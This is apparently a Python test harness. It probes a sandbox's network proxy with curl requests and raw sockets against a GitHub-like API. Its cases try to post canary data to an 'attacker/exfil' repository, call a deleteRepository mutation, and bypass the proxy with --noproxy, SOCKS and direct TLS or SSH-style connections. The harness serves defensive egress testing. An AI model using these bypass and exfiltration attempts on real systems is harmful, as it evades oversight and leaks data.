import json, os, subprocess, socket, ssl, urllib.parse
base='http://172.17.0.1:27680'
results=[]
def case(name,path='/repos/my-org/private-repo',auth='attacker',method='GET',body=None,extra=None,url=None):
 cmd=['curl','--silent','--show-error','--max-time','8','-w','\n%{http_code}', '-X',method]
 token={'attacker':'nas-attacker-fake','managed':os.environ.get('NAS_FIXTURE_TOKEN','missing')}.get(auth)
 if token: cmd+=['-H','Authorization: Bearer '+token]
 if body is not None: cmd+=['-H','Content-Type: application/json','--data',json.dumps(body)]
 if extra: cmd+=extra
 cmd += [url or base+path]
 p=subprocess.run(cmd,text=True,capture_output=True)
 data,status=(p.stdout.rsplit('\n',1) if '\n' in p.stdout else [p.stdout,''])
 try: data=json.loads(data)
 except ValueError: pass
 row={'case':name,'exit_code':p.returncode,'http_status':status,'response':data,'stderr':p.stderr}
 results.append(row);print(json.dumps(row),flush=True)
case('R0_managed_placeholder',auth='managed')
case('R1_attacker_token')
case('R2_no_token',auth=None)
case('R3_allowed_write',method='POST',path='/repos/my-org/private-repo/issues',body={'canary':'nas-a1b-fake-canary'})
case('R4_forbidden_repo',path='/repos/attacker/exfil/issues',method='POST',body={'canary':'nas-a1b-fake-canary'})
case('R5_forbidden_method',method='PUT')
case('R6_forbidden_destination',url='http://172.17.0.1:27681/')
case('G0_allowed_repo',path='/graphql',method='POST',body={'query':'query Probe { repository(owner:"my-org",name:"private-repo") { name } }'})
case('G1_attacker_repo',path='/graphql',method='POST',body={'query':'query Probe { repository(owner:"attacker",name:"exfil") { name } }'})
case('G2_allowed_issue',path='/graphql',method='POST',body={'query':'mutation Probe { createIssue(input:{repositoryId:"trusted-repo-id",title:"nas-a1b-fake-canary"}) { issue { id } } }'})
case('G3_attacker_issue',path='/graphql',method='POST',body={'query':'mutation Probe { createIssue(input:{repositoryId:"attacker-repo-id",title:"nas-a1b-fake-canary"}) { issue { id } } }'})
case('G4_forbidden_operation',path='/graphql',method='POST',body={'query':'mutation Probe { deleteRepository(input:{repositoryId:"attacker-repo-id"}) { clientMutationId } }'})
case('N0_github_no_token',auth=None,url='https://api.github.com/user')
case('N1_github_attacker_token',url='https://api.github.com/user')
case('N2_noproxy_github',url='https://api.github.com/user',extra=['--noproxy','*'])
case('N3_noproxy_forbidden_path',url='https://api.github.com/repos/attacker/exfil',extra=['--noproxy','*'])
case('N4_noproxy_fixture',extra=['--noproxy','*'])
proxy=os.environ.get('HTTPS_PROXY') or os.environ.get('https_proxy')
if proxy:
 u=urllib.parse.urlsplit(proxy)
 case('N5_socks_github',url='https://api.github.com/user',extra=['--proxy','socks5h://'+u.netloc,'--noproxy',''])
else:
 results.append({'case':'N5_socks_github','skipped':'No HTTPS_PROXY provided'})
 print(json.dumps(results[-1]),flush=True)
# A raw TLS socket with GitHub SNI tests the transparent network path.
try:
 s=socket.create_connection(('api.github.com',443),timeout=8)
 ctx=ssl.create_default_context(); t=ctx.wrap_socket(s,server_hostname='api.github.com')
 cert=t.getpeercert(); t.sendall(b'GET /user HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: Bearer nas-attacker-fake\r\nUser-Agent: nas-a1b-probe\r\nConnection: close\r\n\r\n')
 data=b''
 while True:
  chunk=t.recv(65536)
  if not chunk:break
  data+=chunk
 t.close()
 row={'case':'N6_raw_tls','response':data.decode(errors='replace'),'issuer':cert.get('issuer')}
except Exception as e: row={'case':'N6_raw_tls','error':str(e)}
print(json.dumps(row),flush=True)
case('G5_variables_attacker_repo',path='/graphql',method='POST',body={'query':'query Probe($owner:String!,$name:String!) { repository(owner:$owner,name:$name) { name } }','variables':{'owner':'attacker','name':'exfil'}})
case('R7_forbidden_hostname',url='https://example.com/')
try:
 s=socket.create_connection(('api.github.com',443),timeout=8)
 t=ssl.create_default_context().wrap_socket(s,server_hostname='api.github.com')
 t.sendall(b'GET /repos/attacker/exfil HTTP/1.1\r\nHost: api.github.com\r\nAuthorization: Bearer nas-attacker-fake\r\nUser-Agent: nas-a1b-probe\r\nConnection: close\r\n\r\n')
 data=t.recv(65536);t.close()
 print(json.dumps({'case':'N7_raw_tls_forbidden_path','response':data.decode(errors='replace')}),flush=True)
except Exception as e:print(json.dumps({'case':'N7_raw_tls_forbidden_path','error':str(e)}),flush=True)
try:
 s=socket.create_connection(('api.github.com',443),timeout=8)
 s.sendall(b'SSH-2.0-nas-a1b-probe\r\n'); data=s.recv(65536);s.close()
 print(json.dumps({'case':'N8_raw_non_tls','response':data.decode(errors='replace')}),flush=True)
except Exception as e: print(json.dumps({'case':'N8_raw_non_tls','error':str(e)}),flush=True)
